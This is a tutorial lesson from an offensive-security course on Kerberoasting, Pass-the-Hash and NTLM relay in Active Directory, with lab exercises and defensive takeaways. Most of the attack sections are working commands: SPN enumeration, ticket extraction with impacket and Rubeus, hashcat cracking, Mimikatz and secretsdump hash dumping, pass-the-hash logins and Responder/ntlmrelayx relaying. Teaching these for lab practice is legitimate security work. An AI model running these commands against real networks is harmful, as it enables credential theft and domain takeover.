---
title: "Kerberoasting and Pass-the-Hash Intro — SPN Enumeration, TGS Offline Cracking, NTLM Relay Basics"
tags: [Kerberoasting, Pass-the-Hash, NTLM, Kerberos, SPN, TGS, Active-Directory,
       impacket, hashcat, lateral-movement, ATT&CK-T1558.003, ATT&CK-T1550.002]
module: 04-BroadSurface-01
day: 175
related_topics:
  - Credential Stuffing and Spraying (Day 166)
  - Auth Attack Detection (Day 176)
  - Auth Hardening (Day 177)
  - Privilege Escalation (later module)
---

# Day 175 — Kerberoasting and Pass-the-Hash Intro

> "Web attacks get you user credentials. Active Directory attacks get you
> domain admin. The gap between those two things is Kerberoasting and
> Pass-the-Hash. You request a service ticket for any SPN-enabled account,
> crack it offline, and you have that service account's password. No lockout.
> No noise. Domain admin service accounts crack in minutes. This is why
> everyone who calls themselves a red teamer needs to know this."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Explain the Kerberos authentication flow and identify where Kerberoasting
   intercepts it.
2. Enumerate Service Principal Names (SPNs) in an Active Directory domain.
3. Request a TGS ticket for an SPN-enabled account and extract it for
   offline cracking.
4. Crack a TGS hash offline using hashcat.
5. Explain Pass-the-Hash and NTLM relay at a conceptual level, with the
   tools involved.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Authentication concepts | Days 39–41 |
| Password hashing and cracking | Day 34 |
| Credential stuffing context | Day 166 |
| Linux command line | Days 9–10 |

**Note:** This is an introductory lesson — full Active Directory exploitation
is covered in the Year 2 curriculum. Today you learn the concepts and perform
the attack in a lab environment. Real-world AD exploitation requires network
access inside a target domain.

---

## Part 1 — Kerberos Architecture

Kerberos is the default authentication protocol in Active Directory domains
(Windows Server). Understanding the flow is prerequisite to understanding the
attack.

### Kerberos Flow

```
1. Authentication Service (AS) Exchange
   Client → KDC (Key Distribution Center):
     "I am user@DOMAIN. Here is my password hash as proof."
   KDC → Client:
     "Here is your Ticket Granting Ticket (TGT), encrypted with the krbtgt hash.
      You cannot read it — but you can show it to me later."

2. Ticket Granting Service (TGS) Exchange
   Client → KDC:
     "I want to access SQL Server. Here is my TGT."
   KDC → Client:
     "Here is your Service Ticket (TGS), encrypted with the SQL service account's
      NTLM hash."
   ← THIS IS WHERE KERBEROASTING INTERCEPTS

3. Application Service Exchange
   Client → SQL Server:
     "Here is the TGS you issued for me."
   SQL Server: "I decrypt it with my own hash. Valid? Access granted."
```

**The critical insight:** the TGS is encrypted with the service account's
NTLM hash. Any domain user can request a TGS for any SPN-enabled service
account — the KDC does not check whether the requester needs access. The
TGS is then available for offline cracking. No lockout, no privilege required.

---

## Part 2 — Service Principal Names (SPNs)

An SPN associates a service with a specific service account in AD. Any account
with an SPN set is Kerberoastable.

**SPN format:** `SERVICE/hostname:port`

**Common high-value SPNs:**

| SPN | Service | Why it matters |
|---|---|---|
| `MSSQLSvc/sqlserver.domain.local:1433` | SQL Server | Database access |
| `HTTP/webapp.domain.local` | Web app | Web tier access |
| `ldap/dc.domain.local` | LDAP | Directory service |
| `exchangeMDB/mailserver` | Exchange | Email server |
| `kadmin/changepw` | Kerberos admin | KDC itself |

Service accounts are often over-privileged ("service accounts run as Domain
Admin because it's easier"). A cracked service account password = DA credentials.

### Enumerating SPNs

**From inside the domain:**

```powershell
# Windows — native
setspn -T DOMAIN -Q */*

# Windows — via Active Directory module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
  -Properties ServicePrincipalName | Select-Object Name, ServicePrincipalName

# Windows — BloodHound (graph view of Kerberoastable accounts)
# Invoke-BloodHound -CollectionMethod All
```

```bash
# Linux — impacket-GetUserSPNs
impacket-GetUserSPNs DOMAIN/username:password \
  -dc-ip DC_IP_ADDRESS -request
# Outputs: username, SPN, TGS hash
```

---

## Part 3 — Kerberoasting Attack

### 3.1 — Request and Extract TGS Tickets

```bash
# Using impacket-GetUserSPNs (from any domain-joined machine or with valid creds)
impacket-GetUserSPNs domain.local/regularuser:Password123 \
  -dc-ip 192.168.1.10 \
  -request \
  -output hashes.txt

# Output format (Hashcat mode 13100):
# $krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/sqlserver.domain.local~1433*
# $...(ticket data)...
```

**Using Rubeus (from Windows):**

```powershell
# Request all TGS tickets for all Kerberoastable accounts
Rubeus.exe kerberoast /output:hashes.txt

# Target a specific account
Rubeus.exe kerberoast /user:svc_mssql /nowrap
```

**Using PowerSploit (legacy but still common):**

```powershell
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv .\hashes.csv
```

### 3.2 — Crack TGS Tickets Offline

```bash
# Hashcat mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4-HMAC)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for corporate patterns
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# For AES-encrypted tickets (etype 17/18) — modern AD
hashcat -m 19600 hashes.txt wordlist.txt   # AES128-CTS-HMAC-SHA1-96
hashcat -m 19700 hashes.txt wordlist.txt   # AES256-CTS-HMAC-SHA1-96
```

**Performance expectations:**

| Hardware | RC4 (mode 13100) | AES256 (mode 19700) |
|---|---|---|
| RTX 4090 | ~1.5 billion H/s | ~40 million H/s |
| RTX 3080 | ~800 million H/s | ~20 million H/s |
| Cloud V100 | ~500 million H/s | ~15 million H/s |

Rockyou.txt (14M passwords): cracks in under 1 second on decent hardware.
With rules (best64): 14M × 77 rules = 1B attempts — still under a minute.

### 3.3 — Use Cracked Credential

```bash
# Authenticate as the cracked service account
evil-winrm -i DC_IP -u svc_mssql -p CrackedPassword123

# Or connect to SQL Server
impacket-mssqlclient DOMAIN/svc_mssql:CrackedPassword123@sqlserver.domain.local
```

---

## Part 4 — Pass-the-Hash (PtH) — Conceptual Introduction

**What it is:** Windows NTLM authentication does not require the cleartext
password — it uses the NTLM hash directly. If an attacker extracts the NTLM
hash from a compromised machine (LSASS memory, SAM database, registry), they
can authenticate as that user on any system that uses NTLM **without cracking
the hash**.

### How NTLM Authentication Works

```
Client → Server: "I want to connect as DOMAIN\administrator"
Server → Client: "Here is a random challenge (8 bytes)"
Client → Server: "Here is NTLM(hash, challenge)" (the NTLM response)
Server → DC:     "Is this response valid for administrator?"
DC     → Server: "Yes / No"
```

The client never sends the password. It sends `NTLM_hash(challenge)`. If the
attacker has the NTLM hash, they can compute `NTLM_hash(challenge)` for any
challenge — they authenticate as the user.

### Extracting NTLM Hashes

```bash
# From LSASS memory (requires admin on the machine)
# Mimikatz (Windows):
sekurlsa::logonpasswords

# Impacket secretsdump (remote, requires admin credentials):
impacket-secretsdump DOMAIN/admin:password@target-ip

# Output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f4ef22b3522d6be6b84c48fe5c08a47:::
#                   ↑ LM hash (ignore, always the same)                  ↑ NTLM hash
```

### Pass-the-Hash Attack

```bash
# Use the NTLM hash directly — no cracking needed
impacket-psexec DOMAIN/Administrator@target-ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:8f4ef22b3522d6be6b84c48fe5c08a47

# Evil-WinRM with hash
evil-winrm -i target-ip \
  -u Administrator \
  -H 8f4ef22b3522d6be6b84c48fe5c08a47

# SMB lateral movement
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/user@target-ip
```

---

## Part 5 — NTLM Relay — Conceptual Introduction

**What it is:** instead of cracking the NTLM hash, the attacker relays the
authentication challenge/response from one server to another, authenticating
as the victim without ever knowing their credentials.

### Simplified NTLM Relay Flow

```
Victim Machine          Attacker (Responder)     Target Server (e.g. DC)
─────────────           ─────────────────────    ────────────────────
Connects to \\ATTACKER  ← Captures NTLM auth →   Attacker replays to DC
NTLM challenge sent     Forwards challenge  →    Challenge received
NTLM response sent      Relays response     →    DC validates response
                                                 Attacker authenticated as victim!
```

**Tools:**
- `Responder` — captures NTLM authentication from broadcast queries
  (LLMNR, NBT-NS poisoning)
- `ntlmrelayx` (impacket) — takes captured NTLM auth and relays it to targets

```bash
# Terminal 1: Poison LLMNR/NBT-NS to make machines authenticate to you
sudo responder -I eth0 -rdwv

# Terminal 2: Relay all captured auths to a target
sudo impacket-ntlmrelayx -t smb://dc01.domain.local -smb2support
```

**Prerequisite for relay:** SMB signing must be disabled on the target. Check:
```bash
nmap --script smb-security-mode -p 445 192.168.1.0/24
# Look for: Message signing: disabled
```

---

## Lab Exercise — Kerberoasting in a Docker AD Simulation

Since a full AD environment requires Windows Server, use Impacket's test
environment or a pre-built Kerberos lab:

```bash
# Option 1: Install a lightweight Kerberos KDC
sudo apt install krb5-kdc krb5-admin-server

# Create a test realm and service account with an SPN
sudo kadmin.local -q "addprinc -pw Serv1ceP@ss! HTTP/webapp.lab.local@LAB.LOCAL"
sudo kadmin.local -q "addprinc -pw UserP@ss! regularuser@LAB.LOCAL"

# Option 2: Use a pre-built HackTheBox or TryHackMe AD box
# Recommended: HTB Sauna, HTB Forest (Kerberoasting is the path)
# THM: Attacking Kerberos (dedicated room)
```

**Online resources for practice:**

| Resource | What it covers |
|---|---|
| HTB Forest | AS-REP Roasting + Kerberoasting + DCSync |
| HTB Sauna | AS-REP Roasting chain |
| THM Attacking Kerberos | Step-by-step Kerberoasting room |
| GOAD (Game of Active Directory) | Full AD lab with multiple domains |

---

## Key Takeaways

1. **Any domain user can Kerberoast any SPN-enabled account.** There is no
   privilege required beyond being authenticated in the domain. This is by
   design in the Kerberos protocol.
2. **Service accounts are the target because they are over-privileged.** A
   service account named `svc_backup` with Domain Admin rights is the typical
   Kerberoasting jackpot.
3. **RC4 tickets crack fast. AES tickets crack slow.** Organisations that
   enforce AES encryption for Kerberos tickets are significantly harder to
   Kerberoast offline. Check the `msDS-SupportedEncryptionTypes` attribute.
4. **Pass-the-Hash requires the hash, not the password.** Clearing credentials
   from LSASS memory (`Protected Users` security group, Credential Guard) is
   the defence.
5. **NTLM relay requires SMB signing disabled.** Enable SMB signing across
   the domain as a domain-wide group policy — it is the single most impactful
   mitigation against relay attacks.

---

## Exercises

1. In a TryHackMe or HTB lab that includes AD: enumerate all Kerberoastable
   accounts, request their TGS tickets, and crack at least one offline.
   Document: account name, SPN, crack time, cracked password.
2. Set up a local Kerberos KDC (MIT Kerberos on Linux). Create a service
   account with an SPN. Use `impacket-GetUserSPNs` to request and extract
   the TGS. Crack it with hashcat.
3. Research: what is AS-REP Roasting? How does it differ from Kerberoasting?
   Which attribute controls vulnerability? What is the equivalent impacket
   command?
4. Write a CVSS score for a Kerberoasting finding. What are the metrics
   for AV, PR, UI? What is the difference in severity if the cracked account
   is a regular service account vs a Domain Admin service account?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q175.1, Q175.2 …).
> Follow-up questions use hierarchical numbering (Q175.1.1, Q175.1.2 …).

---

## Navigation

← Previous: [Day 174 — Account Takeover Chains](DAY-0174-Account-Takeover-Chains.md)
→ Next: [Day 176 — Auth Attack Detection](DAY-0176-Auth-Attack-Detection.md)
